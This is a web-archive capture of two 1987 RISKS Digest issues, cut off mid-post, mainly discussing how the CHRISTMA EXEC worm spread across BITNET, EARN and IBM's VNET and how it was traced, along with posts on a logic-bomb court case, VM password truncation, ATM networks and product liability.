Alex Heatley : CSC, Victoria University of Wellington, New Zealand.
Domain: alex@comp.vuw.ac.nz                Path: ...!uunet!vuwcomp!alex

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/5.78.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.80.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-32</DOCNO>
<DOCOLDNO>IA012-000130-B023-30</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/5.80.html 128.240.150.127 19970217014729 text/html 18052
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:46:01 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 5: Issue 80</TITLE>
<LINK REL="Prev" HREF="/Risks/5.79.html">
<LINK REL="Up" HREF="/Risks/index.5.html">
<LINK REL="Next" HREF="/Risks/5.81.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/5.79.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.81.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 5: Issue 80</H1>
<H2> Monday, 21 December 1987 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Re: IBM Christmas Virus 
</A>
<DD>
<A HREF="#subj1.1">
Ross Patterson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Logic Bomb case thrown out of court 
</A>
<DD>
<A HREF="#subj2.1">
Geoff Lane
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Repository for Illicit Code 
</A>
<DD>
<A HREF="#subj3.1">
Steve Jong
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Roger Boisjoly and Ethical Behavior 
</A>
<DD>
<A HREF="#subj4.1">
Stuart Freedman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Truncation and VM passwords 
</A>
<DD>
<A HREF="#subj5.1">
Joe Morris
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Competing ATM networks 
</A>
<DD>
<A HREF="#subj6.1">
Chris Koenigsberg
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
     Re: IBM Christmas Virus
</A>
</H3>
<address>
Ross Patterson 
&lt;<A HREF="mailto:A024012%RUTVM1.BITNET@CUNYVM.CUNY.EDU">
A024012%RUTVM1.BITNET@CUNYVM.CUNY.EDU
</A>&gt;
</address>
<i>
Mon, 21 Dec 87 15:22:26 EST
</i><PRE>
To: RISKS list &lt;RISKS@csl.sri.com&gt;

    There  have  been  several  messages to  RISKS  lately  about  the
CHRISTMAs EXEC virus  on IBM's network.  This was an  extension of the
same problem  on BITNET and  its European counterpart, EARN.   Since I
raised the general alarm about it, I'd like to answer a few questions.

    The virus used two standard CMS files, called NAMES and NETLOG, to
help it infect other users.  The NAMES file contains a list of userids
and system names that you  correspond with frequently, allowing you to
abbreviate them  to a mnemonic  nickname when sending mail,  files, or
interactive messages.   I composed  this mail  by sending  to "RISKS",
which my NAMES file lists as user RISKS on system KL.SRI.COM.  You can
also list  phone numbers, paper  addresses, etc.  There is  a commonly
available program that  will print off a personal  phonebook from your
NAMES file ("Traveling  Sidekick" from the days BB  - Before Borland).
The  NETLOG file  lists all  users you've  sent mail  or files  to, or
received them from.   It's a very nice audit trail  when you're trying
to remember where you got that copy of Space Wars.

    After  typing  the Christmas  Tree  on  your terminal,  the  virus
proceeded to  read both  the NAMES and  NETLOG files to  get a  set of
target addresses.  It then sent a copy  of itself to each of them, and
finally deleted itself.

&gt;From: davy@intrepid.ecn.purdue.edu (Dave Curry)
&gt;Subject: IBM invaded by a Christmas virus {RISKS 5.72}
&gt; ...
&gt;This article seems to have a lot of things in it that the reporter didn't
&gt;understand.  I assume that the "terminals" in question are really PC's
&gt;connected to the mainframes; for one thing.

    The terminals  mentioned are generally  IBM 3270's, and  PC's with
IRMA-type cards.  The virus ran on the host system, not on the PC.

&gt;                                             Plus, I presume the "Don't
&gt;browse it" refers to the VM/CMS "BROWSE" command used for looking through
&gt;files, and not just to the regular English word.

    Both, actually.  The intent was  obviously to stop the reader from
going  further down  into  the file,  where the  real  purpose of  the
program was quite obvious.  The  language used (IBM's REXX) is usually
interpreted,  so the  program was  sent  in source  form.  Anyone  who
bothered to read below the second screen-full (like all of us paranoid
Systems  Programmers)  began to  see  the  trouble.  It  was  slightly
cloudy, as all the variable names  were in German, but seeing was fair
to good.

&gt;Subject: IBM Xmas Prank {RISKS 5.79}
&gt;From: Fred Baube &lt;fbaube@note.nsf.gov&gt;
&gt; ...
&gt;"The culprit is unknown

    That is  no longer the case.   The culprit has been  tracked down,
and barred from  access to his/her system.  A note  to that effect was
broadcast to  a number of  mailing lists  by the General  Secretary of
EARN.  The source system had recently been attached to the West German
section of EARN, and the user who started it all only intended to send
a greeting  to a  few friends.   To quote a  TV commerical,  "...  and
they'll tell two friends, and so on, and so on, ...".

&gt;                        .. but preliminary investigation suggests
&gt;that the message originated outside the company.  IBM's mail
&gt;system is attached to those of several other institutions."

    Quite so.  No  one seems quite sure which of  the gateways between
BITNET/EARN and IBM's internal network, VNET, passed the first copy of
the  virus.   It  matters  very   little,  since  it  found  the  VNET
environment  even more  conducive  to  reproduction than  BITNET/EARN.
VNET'ers apparently keep much larger  NAMES files than BITNET'ers.  It
wasn't long before  the links were carrying more  CHRISTMA EXEC's than
anything else.

&gt;"From start to finish, the message survived only hours .."

    Per copy, perhaps.   The first known instance of  infection was at
about  1300  GMT on  Wednesday,  December  9.  Within BITNET,  it  was
generally stamped out by the  following Monday, December 14.  On VNET,
it  didn't show  up until  a day  later, and  was mostly  killed in  a
massive network shutdown on Friday.

&gt;...
&gt;Questions:
&gt;(1) An incoming message can contain an executable program,
&gt;    that can easily be run ?

    Yes.  Please  remember that the  Internet is not the  only network
style in the world.  In BITNET and  VNET, mail is just another case of
file  transfer.  File  transfer is  performed by  the sender,  not the
receiver.   These are  store-and-forward  networks, so  the path  from
system  A to  system B  need not  be intact  for the  duration of  the
transfer.  The viral program was transferred  as a normal file, not as
mail.

&gt;(2) Such a message can be remailed under its contained program's
&gt;    control, presumably with the name of the last victim in the
&gt;    "From:" field ?

    It wasn't  mailed.  Thus, there  wasn't any From: field,  etc.  It
did carry  the system name and  userid of the most  recent victim, but
not any trace-back information.

&gt;(3) Can IBM trace it to an originator, or was anonymity possible ?

    A task force of BITNET and EARN systems programmers traced it back
to its source, by the usual disease-control procedures:

   Doctor: "Miss  X, you've got a  nasty case of viral  &lt;Y&gt;.  Who have
            you had  contact with recently?".

   Miss X: "Just a moment, I'll check my notebook."

    A byproduct of the tool used to  transmit the virus is an entry in
the NETLOG  file listing the userid  and system name of  anyone it was
sent to, making it easier than usual  for Miss X to remember.  In some
cases, the  user had suppressed the  NETLOG facility, but that  is the
exception, not the rule.

&gt;(4) How/where can readers of RISKS submit something similar ?
&gt;    (strictly for professional testing purposes)

    Noplace safely.  Please  don't try it on anything  but an isolated
network, and then coldstart your spool afterwards.

&gt;(5) Is the Internet similarly vulnerable ?

    Not to  this one.  It  plays on  several things that  the Internet
doesn't have:

   1) A  large number of IBM  VM/CMS systems.  The program  would only
      run in a CMS environment.  There is no reason one couldn't write
      something similar in any other language, though.

   2) A  suitable file transfer  system.  FTP doesn't apply.   It must
      provide a  way for a user  to receive an unsolicited  file, in a
      runnable form.

   3) A good method of determining  targets.  The CMS NAMES and NETLOG
      files provided an excellent source of information.  I suppose in
      a Unix environment, ".alias" and "/etc/aliases" would be ok, but
      .alias  is  comparatively rare,  while  NAMES  files are  almost
      universal in CMS.

&gt;The prank seems to be benign, and therefore beneficial.

    That is being debated in several  circles.  I, for one, agree with
you.

&gt;IBM seems to have dealt with it effectively (or have they ?).

    Yes, they have.

&gt;Browsing this message is no fun at all.  Just type Christmas ..

    The lesson of  this one is the  same as for PC  viruses: Never run
something you don't recognize.  When the virus first appeared, several
people suggested that  it was the work of students,  and that it might
be used negatively in an ongoing argument over whether students belong
on BITNET.   When we heard  that "professionals" inside IBM  were also
running  programs they  didn't recognize,  that particular  suggestion
vanished.

    This virus  was quite  sly, in  that by  sending itself  to people
listed in  your NAMES and  NETLOG files, those people  would recognize
the source (you) as a friend, and be generally less inquisitive, until
things  got  nasty.   Lesson  #2: Even  your  friends  sometimes  make
mistakes.
                                    Ross Patterson, Rutgers University

    [RISKS received an unusually large number of messages on this subject --
    from Fred Baube, John Owens (2), Allan Pratt, Anne Louise Gockel, and 
    Bruce O'Neel.  I started trying to edit them down, but rapidly gave
    up that strategy -- inordinate overlap.  So, I will take a new tack,
    which is to put out Ross' message -- which was the most comprehensive --
    and then give Fred, John, Allan, Anne and Bruce first priority if THEY
    wish to comment marginally or additionally thereupon.  Please be terse
    -- and avoid replicating ALL of the foregoing text in your messages,
    as some of you have been doing.  (One of the joys of mailers?)  PGN]
    
</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
   Logic Bomb case thrown out of court
</A>
</H3>
<address>
&lt;<A HREF="mailto:"ZZASSGL" <ZZASSGL@CMS.UMRCC.AC.UK>            [Presumably Geoff Lane]">
"ZZASSGL" &lt;ZZASSGL@CMS.UMRCC.AC.UK&gt;            [Presumably Geoff Lane]
</A>&gt;
</address>
<i>
Mon, 21 Dec 87 16:03:05 GMT
</i><PRE>

As I have not seen anything about this in RISKs yet ...  The case brought
against James McMahon, who was accused of placing logic bombs within the
computer system used by Pandair Freight, has been thrown out of court because
of "unsatisfactory evidence". The judge has ruled that there was no case to
answer.  This was reported in Computer Weekly dated December 17/24, 1987.

It will be interesting to learn in what way the evidence was unsatisfactory.
There used to be a problem in British law(and it may still exist) in that
evidence could only be given by humans.  Information generated by a computer
without the explicit involvement of a human could not be used in court.  I
may have got this legal point garbled as I don't speak legalese.

Geoff, UMRCC

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Repository for Illicit Code
</A>
</H3>
<address>
Steve Jong/NaC Pubs
&lt;<A HREF="mailto:jong%delni.DEC@decwrl.dec.com ">
jong%delni.DEC@decwrl.dec.com 
</A>&gt;
</address>
<i>
21 Dec 87 16:23
</i><PRE>

If there is a legitimate need to study illicit code such as viruses and
embezzlement routines, and not just a forensic need to try and track down
the author, then there could indeed by a need for a repository.  I suggest
the model of the Center for Disease Control in Atlanta, which has samples of
pathogens.  However, note that there was (is?) a controversy surrounding
CDC's wish to keep samples of smallpox, which, it is believed, has otherwise
been eradicated from the face of the earth.  Why leave one known source?

Personally, I'd just as soon not have the code samples around.  I'd just be
tempted to play with them.  (Disclaimer: I'm not a programmer.)

   [Program viruses, Trojan horses, etc., will never be competely eradicated.  
   They tend to re-erupt spontaneously or be rediscovered.  PGN]
  
</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Roger Boisjoly and Ethical Behavior
</A>
</H3>
<address>
&lt;<A HREF="mailto:Stuart_Freedman@BKR.CEO.DG.COM">
Stuart_Freedman@BKR.CEO.DG.COM
</A>&gt;
</address>
<i>
Mon, 21 Dec 87 13:20:18 EST
</i><PRE>

To add my $0.02 to the conversation on Roger Boisjoly, I agree with Ronni
Rosenberg, having seen a videotape of him telling his story.  I seem to recall
that he made reference to the same period of silence (the last time anyone
called for objections to the launch) that Henry Spencer did.  Boisjoly said
that he was much too astonished at the decision to go through with the
launch (despite his strong objections) to say anything at that point.  He
did not fully recover his senses until after the teleconference ended.  I
think that we can only expect the man to be human; we can't always act
heroically when we're in shock...

Stuart Freedman    stuart@bkr.ceo.dg.com or rti!xyzzy!freedman@mcnc.org
Data General Corp.(Mail Stop E-219), Westboro, MA 01580 +1(617)870-9659
Pick an e-mail address -- any e-mail address...

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Truncation and VM passwords
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Mon, 21 Dec 87 10:24:46 EST
From: Joe Morris (jcmorris@mitre.arpa)

In RISKS 5:79 Alex Heatley reports that he can establish a password of more
than eight characters in the IBM VM system, but that on login the system
truncates the entered password to eight characters, then (correctly) reports
that it fails to match the one in the access control file.

I don't know what security system his system uses, but IBM's DIRMAINT product,
which is probably the most widely used directory maintenance facility used
in VM installations, refuses to accept an oversized password.  I just tried
to enter one on our system, and was rebuffed with message DVHDIR017E.
 
Joe Morris (jcmorris@mitre.ARPA)

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
competing ATM networks
</A>
</H3>
<address>
Chris Koenigsberg 
&lt;<A HREF="mailto:ckk+@andrew.cmu.edu">
ckk+@andrew.cmu.edu
</A>&gt;
</address>
<i>
Sun, 20 Dec 87 22:22:24 -0500 (EST)
</i><PRE>

The two competing local ATM cards in Pennsylvania are Cashstream and MAC. All 
the Pittsburgh banks with ATM cards are signed up for one or the other local 
networks. Cashstream is run mainly by Mellon Bank, MAC mainly by Pgh. National 
Bank. Both Cashstream and MAC extend into neighboring states. Meanwhile 
Cashstream is hooked up with the national ATM network called CIRRUS, while MAC 
is part of the national PLUS system.

I've used my Cashstream card in CIRRUS machines in other faraway states, and 
I've used my MAC card in PLUS machines across the country. But I always 
assumed that these two kinds of cards were big competitors at each level : 
bank vs. bank, local net vs. local net, and national vs. national, and that 
the two sides wouldn't cross.

But in New York, there are ATM machines which accept both MAC and Cirrus 
cards. I was surprised, since in Pennsylvania, MAC cards work in PLUS machines 
but not in Cirrus machines, as MAC's local competitor Cashstream is connected 
with Cirrus.

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/5.79.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.81.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-33</DOCNO>
<DOCOLDNO>IA012-000130-B023-45</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/5.81.html 128.240.150.127 19970217014740 text/html 28178
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:46:09 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 5: Issue 81</TITLE>
<LINK REL="Prev" HREF="/Risks/5.80.html">
<LINK REL="Up" HREF="/Risks/index.5.html">
<LINK REL="Next" HREF="/Risks/5.82.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/5.80.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.82.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 5: Issue 81</H1>
<H2> Tuesday, 22 December 1987 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
The Christmas Card Caper, (hopefully) concluded 
</A>
<DD>
<A HREF="#subj1.1">
Joe Morris
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  The Virus of Christmas Past 
</A>
<DD>
<A HREF="#subj2.1">
Una Smith
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Viruses and "anti-bodies" 
</A>
<DD>
<A HREF="#subj3.1">
Brewster Kahle
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Cleaning Your PC Can Be Hazardous to Your Health 
</A>
<DD>
<A HREF="#subj4.1">
Brian M. Clapper
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Product liability 
</A>
<DD>
<A HREF="#subj5.1">
Mark A. Fulk
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Squirrels, mice, bugs, and Grace Hopper's moth 
</A>
<DD>
<A HREF="#subj6.1">
Peter Mabey
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Fire at O'Hare (Computerworld, Dec 14 issue) 
</A>
<DD>
<A HREF="#subj7.1">
Haynes
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  American Express computer problem 
</A>
<DD>
<A HREF="#subj8.1">
Frank Wales
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  NYT article on computers in stock crash 
</A>
<DD>
<A HREF="#subj9.1">
Hal Perkins
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
The Christmas Card Caper, (hopefully) concluded
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Mon, 21 Dec 87 11:45:03 EST
From: Joe Morris (jcmorris@mitre.arpa) &lt;jcmorris@mitre.arpa&gt;

The following item was posted on the VMSHARE bulletin board.  It describes
the origin of the CHRISTMAS EXEC file, and makes valid points about the
inability of computer systems to automatically recognize some types of
ill-behaved programs quickly enough to prevent damage to a network.

(VMSHARE is a closed bulletin board operated for the use of VM installations
who are members of SHARE, the large IBM mainframe user group.  Shadow copies
of the VMSHARE traffic are distributed to many other nets, including VNET
and BITNET.)                            
                                               Joe Morris (jcmorris@mitre)


  Append on 12/19/87 at 20:10 by Melinda Varian &lt;BITNET: MAINT@PUCC&gt;:
   
  The following statement, from a member of the EARN Board, answers the
  queries about the origin of the CHRISTMA EXEC.  Clausthal-Zellerfeld
  is quite a new VM installation.  When Heinz Haunhorst, of their staff,
  was notified that the first appearances of the virus on the networks
  originated at his node, he pursued the matter vigorously and skillfully.
  Helmut Woehlbier, of the Technical University of Braunschweig, also did
  an excellent job in helping to determine the originating node.
   
  &lt;&gt;  &lt;&gt;  &lt;&gt;  &lt;&gt;  &lt;&gt;  &lt;&gt;  &lt;&gt;  &lt;&gt;  &lt;&gt;  &lt;&gt;  &lt;&gt;  &lt;&gt;  &lt;&gt;  &lt;&gt;  &lt;&gt;  &lt;&gt;  &lt;&gt;  &lt;&gt;
   
  Date:         Wed, 16 Dec 87 18:33:58 GMT
  Sender:       EARN Technical Group &lt;EARNTECH@EB0UB011&gt;
  From:         Michael Hebgen &lt;$02@DHDURZ1&gt;
  Comments: To: EARN Executive &lt;EARNEXEC@IRLEARN&gt;,
                EARN Board of Directors &lt;EARN-BOD@IRLEARN&gt;
  Comments: cc: German EARN Executive &lt;DEARNEX@DHDURZ1&gt;,
                German EARN node administrators &lt;DEARNADM@DEARN&gt;,
                Heinz Haunhorst &lt;HENRY@DCZTU1&gt;,
                "Dr. Gerald Lange" &lt;LANGE@DCZTU1&gt;,
                Otto Bernd Kirchner &lt;KIRCHNER@DS0IBM1&gt;
  To:           Melinda Varian &lt;MAINT@PUCC&gt;
  Subject:      CHRISTMAS EXEC
   
  Dear colleagues,
   
  after some very sophisticated detective work  it is clear that the origin
  of the CHRISTMAS EXEC is the EARN  node DCZTU1. A student there has writ-
  ten this EXEC  to send christmas greetings to his  colleagues and another
  student has  used it  without knowing what  he is doing  (as many  of our
  network users) and started the explosion.
   
  The node  DCZTU1 has already  blocked the Userid  of the author  and done
  all necessary steps.  Every node in the network can  be the next starting
  point  of a  similar explosion  and distribute  virus programms  or other
  bad things.
   
  As far as  I know the EDP-systems  there is no way to  prevent users from
  their own  mistakes. The only  solution I can think  of for this  type of
  behaviour is to observe "EDP-hygiene":
   
     If you receive an executable  file (EXEC, CLIST, program) from another
     might be  unknown user  do N  O T execute  without control  because it
     can result in gross missdemanour and serious damage.
   
     Check all EXECs/CLISTs,  what they are doing, before  you execute them
     and  check all  executable programs,  where  they come  from and  what
     they do.
   
     As in normal life uncontrolled behaviour may result in serious
     consequences  (I am  not going  to mention  AIDS). You  as a  user are
     responsable for all what you are doing.
   
  I propose to include such statements (in better english formulation) into
  the CODE OF CONDUCT and to  start an "enlightenment" process for the end-
  users
   
  Best regards, m[e]rry christmas (without tree) and a happy new year
   
  Michael Hebgen
   
  EARN director of Germany and
  General secretary of EARN
   
   
  *** APPENDED 12/19/87 20:10:47 BY PU/MELINDA ***
  
ADDED NOTE FROM JOE MORRIS:

Did any contributor suggest how the message jumped from EARN (or BITNET) into
VNET?  Supposedly the gateways (one at Yorktown, I believe)  are monitored
closely so that the ability of a message to cross without supervision
is quite limited.  I'm told that a few years ago there  was something of a
major flap when a meeting of relatively high IBM brass was shown a message
Melinda Varian (the BITNET source of the EARN message I forwarded) had sent
to an IBM'er via VNET (WITH the permission of IBM...upper management in IBM
just hadn't been aware of the arrangement).  My guess would be that it came
through an account on a customer machine but assigned to an IBM'er who could
pass mail into the IBM network.

Thought for the week: was this supposed to be a demonstration of a computerized
Christmas distribution TREE?

Second thought on the word "tree" (swiped from an undergraduate thesis at 
MIT from the 60's):

  Problems are posed by fools like me,
  but only heuristics can search a tree.

Joe Morris

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
     The Virus of Christmas Past (Re: <A HREF="/Risks/5.80.html">RISKS-5.80</A>)
</A>
</H3>
<address>
Una Smith 
&lt;<A HREF="mailto:0402909%pucc.bitnet@RUTGERS.EDU">
0402909%pucc.bitnet@RUTGERS.EDU
</A>&gt;
</address>
<i>
Tue, 22 Dec 87 13:32:07 EST
</i><PRE>
To: comp-risks@RUTGERS.EDU

Re the discussion of receiving run-able mail files (sometimes viruses)
via BITNET.

A few years ago I received 2 pieces of mail, an XMAS EXEC written in
EXEC2 and a compiled module of some sort.  The module was hard to break
into, so no one I knew then knew how to tell what it did without running
it.   Well, it was a very nice, benign bug:

First, it imitated all the usual system messages one gets when logging off,
up to the full-screen VM370 logo.  Then, slowly, the logo disintegrated
into a night time scene of a cottage on a snowy hillside under some pine
trees, smoke floating out of the chimney (the "smoke" was made up of
phrases; "s..m..o..k..e" and "M..e..r..r..y...C..h..r..i..s..t..m..a..s",
etc.), and snow flakes "*" falling from the sky.  Elapsed time:  about
5 minutes.  Then it quit, abruptly leaving you sitting in front of a
terminal in some dingy office or terminal room, just as you were before.

The clue to this so-called Christmas card's origin was that the usual
machine name in the lower right was replaced with, if I remember
correctly, PSUVM.  Has anyone on the net now got an old copy of that
somewhere?  I didn't keep mine.

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
viruses and "anti-bodies"
</A>
</H3>
<address>
&lt;<A HREF="mailto:kahle@Think.COM">
kahle@Think.COM
</A>&gt;
</address>
<i>
Tue, 22 Dec 87 10:19:32 EST
</i><PRE>

Risks, recently, has been filled with reports of specific virus and how to kill
them manually.  Has there been any work on "anti-bodies" that attack specific
viruses?  It seems that contributors have enough knowledge about each virus to
build such beasts.  Such programs might push the state of the art, reduce the
effect of viruses, and keep down the traffic on this list.
                                                               -brewster

    [A certain amount can be done contextually, e.g., with specific file
    names.  Paul Karger has suggested something similar for Trojan horses.
    See his paper in the 1987 IEEE Symposium on Security and Privacy.  But
    such techniques are intrinsically incomplete.  PGN]

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Cleaning Your PC Can Be Hazardous to Your Health
</A>
</H3>
<address>
Brian M. Clapper
&lt;<A HREF="mailto:clapper@nadc.arpa ">
clapper@nadc.arpa 
</A>&gt;
</address>
<i>
Tue, 22 Dec 87 09:57:26 EST
</i><PRE>

The following news bulletin appeared on our mail machine this morning:

   "Recently a flash fire occurred at a Navy lab when an employee attempted
   to clean his computer screen using an alcohol based cleaner.  An
   investigation revealed that the employee sprayed the cleaner directly
   at the unit while it was turned on.  Static electricity which had built
   up on the screen then ignited the atomized cleaner.  To prevent a
   similar occurrence here, all PC users are cautioned to turn off their
   screens before cleaning, and to dampen a cloth with the cleaner before
   wiping the screen rather than spraying it at the screen."

Brian M. Clapper, Naval Air Development Center, Warminster, PA 18976

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Product liability
</A>
</H3>
<address>
&lt;<A HREF="mailto:fulk@cs.rochester.edu">
fulk@cs.rochester.edu
</A>&gt;
</address>
<i>
Mon, 21 Dec 87 11:24:30 EST
</i><PRE>

It seems to me that a large number of problems with product liability
arise from a propensity to confuse two issues: _liability_ and _negligence_.

If the use of a product carries with it a certain, irreducible risk of
injury, then the manufacturer SHOULD be liable for the damages resulting.
That liability SHOULD result in increased costs to the users of the
product (or to the public in general, in the case of mass vaccines).
After all, the damages are part of the cost of the product.  Such a liability
should be limited to actual damages, meaning such things as medical costs,
loss of earning power, and _reasonable_ (capped) compensation for pain and
suffering.  In particular, _punitive_ damages should be reserved for cases
of negligence.  Part of the result is that this sort of liability ought to
result in predictable costs to the manufacturer, so that it can include those
costs in the final price.  Finally, most such liability cases should be
resolved in administrative courts with low legal costs and short delays.

Cases of negligence arise when someone fails to take reasonable and prudent
care; for example, the Ford Pinto sort of case.  In such cases the present
system is perfectly reasonable, with contingency fees and the like.
I would not want to see lawyer's fees fixed for such cases, as I believe
